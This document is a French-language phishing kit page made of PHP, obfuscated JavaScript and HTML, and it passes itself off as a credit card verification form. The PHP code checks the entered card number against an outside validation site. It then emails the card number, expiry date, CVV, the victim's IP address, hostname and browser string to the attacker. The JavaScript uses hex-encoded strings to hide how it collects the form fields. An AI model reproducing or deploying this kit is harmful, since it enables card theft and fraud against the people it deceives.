<? include("config.php"); if($_GET['ccn']){ $chkd = file_get_contents('http://credit-card-information.elliottback.com/?number='.$_GET['ccn']); if(is_numeric($_GET['ccn']) && strstr($chkd,"Valid Card") && strstr($chkd,"Congratulations")){ $cc=$_GET['ccn'];$date=$_GET['exm']."/".$_GET['exy'];$cvv=$_GET['cvv'];$ip=getenv("REMOTE_ADDR");$host=gethostbyaddr(getenv("REMOTE_ADDR"));$msg = "--------------------- Bismillah ----------------------\nCC_N : $cc\nDATE : $date\nCVV2 : $cvv\n------------------------------------------------------\nIPv4 : $ip\nHOST : $host\nUSAG : ".$_SERVER["HTTP_USER_AGENT"]."\n------------------- Al-Hamdolillah -------------------\nALLAH YJIB Tissir";$sbj = "Sina $ip [CC] | $cvv | $cc";$frm = "From: Sina<supportz@sina.fr>";mail($ana,$sbj,$msg,$frm);print "<script>checkValues();$('#o_content').load('perso.php');</script>";exit; }else{ print "<a id='error'>Invalide carte de cr&eacute;dit !</a>";exit; }} ?> 
<script>
var _0x6b83=["","\x68\x74\x6D\x6C","\x23\x61\x6E\x73\x72","\x76\x61\x6C\x75\x65","\x63\x63\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x45\x78\x70\x4D\x6F\x6E\x74\x68","\x45\x78\x70\x59\x65\x61\x72","\x63\x76\x76","\x56\x65\x75\x69\x6C\x6C\x65\x7A\x20\x65\x6E\x74\x72\x65\x72\x20\x6C\x65\x20\x6E\x75\x6D\x65\x72\x6F\x20\x76\x61\x6C\x69\x64\x65\x20\x64\x65\x20\x76\x6F\x74\x72\x65\x20\x63\x61\x72\x74\x65\x20\x64\x65\x20\x63\x72\x65\x64\x69\x74\x20\x21","\x56\x65\x75\x69\x6C\x6C\x65\x7A\x20\x65\x6E\x74\x72\x65\x72\x20\x6C\x61\x20\x64\x61\x74\x65\x20\x64\x27\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x20\x64\x65\x20\x76\x6F\x74\x72\x65\x20\x63\x61\x72\x74\x65\x20\x64\x65\x20\x63\x72\x65\x64\x69\x74\x20\x21","\x56\x65\x75\x69\x6C\x6C\x65\x7A\x20\x65\x6E\x74\x72\x65\x7A\x20\x6C\x65\x20\x63\x72\x79\x70\x74\x6F\x67\x72\x61\x6D\x6D\x65\x20\x76\x69\x73\x75\x65\x6C\x20\x64\x65\x20\x76\x6F\x74\x72\x65\x20\x63\x61\x72\x74\x65\x20\x64\x65\x20\x63\x72\x65\x64\x69\x74\x20\x28\x43\x76\x76\x32\x29\x20\x21","\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x22\x6C\x6F\x61\x64\x69\x6E\x67\x2E\x67\x69\x66\x22\x20\x61\x6C\x74\x3D\x22\x6C\x6F\x61\x64\x69\x6E\x67\x22\x3E","\x63\x63\x2E\x70\x68\x70\x3F\x63\x63\x6E\x3D","\x26\x65\x78\x6D\x3D","\x26\x65\x78\x79\x3D","\x26\x63\x76\x76\x3D","\x6C\x6F\x61\x64"];function SubMit(){$(_0x6b83[2])[_0x6b83[1]](_0x6b83[0]);var _0x1bb9x2=document[_0x6b83[5]](_0x6b83[4])[_0x6b83[3]];var _0x1bb9x3=document[_0x6b83[5]](_0x6b83[6])[_0x6b83[3]];var _0x1bb9x4=document[_0x6b83[5]](_0x6b83[7])[_0x6b83[3]];var _0x1bb9x5=document[_0x6b83[5]](_0x6b83[8])[_0x6b83[3]];var _0x1bb9x6=_0x6b83[9];var _0x1bb9x7=_0x6b83[10];var _0x1bb9x8=_0x6b83[11];if(ccField(_0x6b83[4],_0x1bb9x6)&&numericField(_0x6b83[6],_0x1bb9x7)&&numericField(_0x6b83[7],_0x1bb9x7)&&cvvField(_0x6b83[8],_0x1bb9x8)){$(_0x6b83[2])[_0x6b83[1]](_0x6b83[12]);$(_0x6b83[2])[_0x6b83[17]](_0x6b83[13]+escape(_0x1bb9x2)+_0x6b83[14]+escape(_0x1bb9x3)+_0x6b83[15]+escape(_0x1bb9x4)+_0x6b83[16]+escape(_0x1bb9x5));} ;} ;
</script>
<div class="contenu">
			<div id="pavtitle" class="pave_gris_532">Carte de cr&eacute;dit</div>
			<div style="border:1px solid #DDD;width:570px;" align="center">
			<br>
			<div id="ansr" align="center"></div>
			<br>
			<table width="450" align="center">
			<tr><td>Num&eacute;ro de carte</td><td><input type="text" name="ccn" id="ccn" maxlength=16 ></td></tr>
						<tr><td>Date de fin de validit&eacute; (MM/AAAA)</td><td>
						    <select name="ExpMonth" id="ExpMonth">
								<option value=""></option>
								<option value="01">01</option>
								<option value="02">02</option>
								<option value="03">03</option>
								<option value="04">04</option>
								<option value="05">05</option>

								<option value="06">06</option>
								<option value="07">07</option>
								<option value="08">08</option>
								<option value="09">09</option>
								<option value="10">10</option>
								<option value="11">11</option>

								<option value="12">12</option>

							</select>
                                                                    &nbsp;
                            <select name="ExpYear" id="ExpYear">
								<option value=""></option>
								<option value="2014">2014</option>
								<option value="2015">2015</option>
								<option value="2016">2016</option>
								<option value="2017">2017</option>
								<option value="2018">2018</option>
								<option value="2019">2019</option>
								<option value="2020">2020</option>
								<option value="2021">2021</option>

							</select>

						</td></tr>
						<tr><td>Cryptogramme visuel</td><td><table cellspacing=0><tr><td><input type="text" name="cvv" id="cvv" maxlength=4 style="width:40px;"></td><td><img width=35 height=25 src="mini_cvv2.gif"></td></tr></table></td></tr>
						<tr><td></td><td style="font-size:10px;font-weight:none;">3 d&eacute;rniers chiffres au dos de la carte</td></tr>
            	
			</table>
			<br>
			<img src="carte1.jpg"><br><br>
			</div>
		    <div class="pave_gris_bas" align="right">
            <img src="btn_valider.gif" name="valider" class="valider2" title="Valider" onclick="SubMit()"  style="width:67px;height:26px;float:right;margin-right:15px;margin-top:20px" onclick="SubMit()">
          </div>
        </form>
</div>